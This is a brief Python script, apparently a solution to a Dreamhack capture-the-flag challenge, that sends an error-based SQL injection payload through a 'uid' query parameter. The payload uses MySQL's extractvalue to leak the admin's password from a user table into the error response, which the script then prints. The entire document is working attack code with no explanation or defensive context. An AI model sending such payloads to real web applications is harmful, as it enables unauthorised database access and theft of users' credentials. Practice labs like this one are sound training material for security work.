
from requests import get

url = "http://host3.dreamhack.games:21630/"

query = f"admin' and extractvalue(1, concat(0x3a, (SELECT upw FROM user WHERE uid='admin')));"

r = get(f"{url}/?uid={query}")

print(r.text)